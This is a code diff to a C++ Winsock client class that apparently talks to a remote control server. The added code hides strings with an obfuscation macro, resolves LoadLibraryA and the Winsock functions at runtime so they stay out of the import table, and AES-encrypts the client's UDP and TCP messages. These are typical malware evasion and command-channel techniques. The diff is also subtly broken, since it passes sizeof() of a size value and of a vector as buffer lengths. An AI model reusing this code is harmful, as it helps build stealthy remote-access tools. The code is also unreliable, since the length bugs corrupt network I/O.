@@ -1,11 +1,16 @@
 #include "../Headers/client.h"
 #include "../Headers/obfuscate.h"
 #include "../Headers/procutils.h"
+#include "../Headers/aes.hpp"
+
+//#include <openssl/evp.h>
+//#include <openssl/aes.h>
 
 #define winsock32 std::string(HIDE("Ws2_32.dll"))
 
 Client::Client() {
 	LoadWSAFunctions();
+	OutputDebugStringA("Loaded WSA Functions");
 
 	WORD version = MAKEWORD(2, 2);
 	WSAData data = { 0 };
@@ -27,7 +32,10 @@ VOID Client::LoadWSAFunctions() {
 	if ( WSAInitialized )
 		return;
 
-	HMODULE WINSOCK = ProcessUtilities::GetModHandle(winsock32); // load winsock
+	HMODULE kernel32 = ProcessUtilities::GetModHandle(ProcessUtilities::freqDLLS::kernel32); // load winsock
+	ProcessUtilities::PPROCFN::_LoadLibrary load = ProcessUtilities::GetFunctionAddress<ProcessUtilities::PPROCFN::_LoadLibrary>(kernel32, std::string(HIDE("LoadLibraryA")));
+	
+	HMODULE WINSOCK = load(winsock32.c_str());
 
 	// function pointers from winsock
 	StartWSA	  = ProcessUtilities::GetFunctionAddress<_WSAStartup>(WINSOCK, std::string(HIDE("WSAStartup")));
@@ -88,11 +96,27 @@ BOOL Client::SocketReady(SocketTypes type) const {
 	return socketReady == TRUE && WSAInitialized;
 }
 
+BYTESTRING Client::EncryptClientRequest(ClientRequest req) const {
+	NET_BLOB blob;
+	blob.aesKey = this->EncryptionKey;
+	blob.cr = req;
+
+	BYTESTRING buff = NetCommon::AESEncryptBlob(blob);
+
+	return buff;
+}
+
+ServerRequest Client::DecryptServerRequest(BYTESTRING req) {
+	return DecryptInternetData<ServerRequest>(req);
+}
+
 BOOL Client::UDPSendMessageToServer(ClientMessage message) {
 	if ( !SocketReady(UDP) )
 		return FALSE;
 
-	int sent = SendTo(this->UDPSocket, ( char* ) &message, sizeof(message), 0, NULL, NULL);
+	BYTESTRING encrypted = EncryptClientRequest(message);
+
+	int sent = SendTo(this->UDPSocket, reinterpret_cast<char*>(encrypted.data()), sizeof(encrypted.size()), 0, NULL, NULL);
 	if ( sent == SOCKET_ERROR )
 		return FALSE;
 
@@ -100,25 +124,28 @@ BOOL Client::UDPSendMessageToServer(ClientMessage message) {
 		Set up a UDPResponse buffer to receive information
 		from the server and interpret it as a struct
 	*/
-	auto udpResponseBuffer = std::make_unique<char[]>(sizeof(UDPResponse));
-
-	int received = ReceiveFrom(this->UDPSocket, udpResponseBuffer.get(), sizeof(udpResponseBuffer), 0, NULL, NULL);
+	BYTESTRING udpResponseBuffer;
+	udpResponseBuffer.resize(1000);
+	int received = ReceiveFrom(this->UDPSocket, reinterpret_cast<char*>(udpResponseBuffer.data()), sizeof(udpResponseBuffer), 0, NULL, NULL);
 	if ( received == SOCKET_ERROR )
 		return FALSE;
 
-	UDPResponse* response = reinterpret_cast< UDPResponse* >( udpResponseBuffer.get() );
+	// decrypt the udp response and cast it to UDPResponse
+	UDPResponse response = DecryptInternetData<UDPResponse>(udpResponseBuffer);
 
 	// update connected server after receiving a udp response from the server
-	if (response->isValid) this->ConnectedServer = response->TCPServer;
+	if (response.isValid) this->ConnectedServer = response.TCPServer;
 
-	return response->isValid;
+	return response.isValid;
 }
 
 BOOL Client::TCPSendMessageToServer(ClientMessage message) {
 	if ( !SocketReady(TCP) )
 		return FALSE;
 
-	int sent = Send(this->TCPSocket, reinterpret_cast< char* >( &message ), sizeof(ClientMessage), 0);
+	BYTESTRING encryptedRequest = EncryptClientRequest(message);
+
+	int sent = Send(this->TCPSocket, reinterpret_cast< char* >( encryptedRequest.data() ), encryptedRequest.size(), 0);
 	if ( sent == SOCKET_ERROR )
 		return FALSE;
 
